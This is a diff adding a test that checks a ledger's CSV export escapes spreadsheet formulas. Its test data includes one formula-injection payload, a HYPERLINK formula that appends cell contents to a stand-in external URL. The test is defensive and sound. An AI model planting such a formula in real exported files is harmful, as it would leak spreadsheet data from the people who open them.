@@ -60,6 +60,10 @@ test('the ledger is searched with combined filters, corrected into versions, mar
 
   const csv = (await ledger({ action: 'export_csv', network: 'reddit' })).body.result.csv.trim().split('\n')
   assert.equal(csv.length, 2); assert.ok(csv[1].startsWith('l-reddit,')); assert.ok(csv[1].includes('"Thread answer, with a comma."'))
+  // A field a spreadsheet would read as a formula opens as the words that were posted.
+  await insertEntry('l-formula', { network: 'hn', person_id: owner.id, by: '@Synthetic Poster', text: '=HYPERLINK("https://example.com/?"&A2,"open")', route: 'handed_off', confirmation: 'person', posted_at: now - 3 * day })
+  const formula = (await ledger({ action: 'export_csv', network: 'hn' })).body.result.csv.trim().split('\n')[1]
+  assert.ok(formula.includes(`"'=HYPERLINK(""https://example.com/?""&A2,""open"")"`)); assert.ok(formula.includes(`"'@Synthetic Poster"`))
 
   const friend = app.email('poster')
   await app.action('owner', 'stump.team.manage', { action: 'invite', email: friend, display_name: 'Synthetic Poster', role: 'poster', connection: 'friend' })
